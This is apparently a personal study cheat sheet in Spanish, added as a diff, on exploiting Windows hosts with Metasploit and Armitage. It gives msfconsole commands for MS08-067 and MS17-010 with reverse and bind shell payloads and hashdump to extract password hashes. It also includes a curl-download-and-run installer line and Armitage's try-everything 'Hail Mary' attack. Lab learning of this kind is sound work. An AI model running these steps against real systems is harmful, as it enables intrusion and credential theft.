@@ -1,0 +1,60 @@
+
+EXPLOTACIÓN
+
+|Metasploit|   en kali se actualiza con apt update
+
+	service postgresql start                        [para usar la base de datos, se actualiza desde apt]
+
+	msfconsole                                      [abre su propia consola]
+	search ms08-067                                 [vulnerabilidad detectada por OpenVAS]
+	use exploit/windows/smb/ms08_067_netapi         [revelado por el comando anterior]
+	show payloads
+
+1.	set payload windows/vncinject/reverse_tcp
+	show options
+	set RHOST 192.168.20.51                         [dirección de ataque]
+	set LHOST 192.168.10.5                          [mi IP]
+	show options
+	exploit
+
+2.	set payload windows/meterpreter/bind_tcp
+	set RHOST 192.168.20.51
+	exploit
+	dir                                             [estoy en system32 del atacado]
+	hashdump                                        [estando en system32, extrae las llaves de cifrado de contraseñas para ataques de diccionario]
+
+
+
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+sudo service postgresql start
+msfupdate
+
+sudo /opt/metasploir-frameword/bin/msfconsole
+--> search [ms17-010, conseguido por openvas]          search windows 2003           search exploir windows 2003
+    search payload windows meterpreter reverse tcp
+--> use [5]
+--> show payloads
+--> set payload [windows/...]   o el id
+--> show options
+--> set RHOST 192.168.0.153
+--> exploit
+en meterpreter usar 'help'
+
+
+Análisis de metadatos: ver la aplicación de chema alonso https://www.elevenpaths.com/es/labstools/foca-2/index.html
+Jotti y Virus Total son sandbox online
+
+
+
+|ARMITAGE|
+Buscamos una interface gráfica que automatice la búsqueda de exploits y payloads vía metasploit y su base de datos
+Abrir desde 08-Explotation Tools, localhost port 55553
+Hosts/Add host... (víctima), click, Scan
+Hosts/Nmap Scan, detectar OS
+(terminado)
+Attacks/Find Attacks | Hail Mary intenta todo lo disponible
+Click Attack/smb/ms08-067 netapi
+Use a reverse connection
+
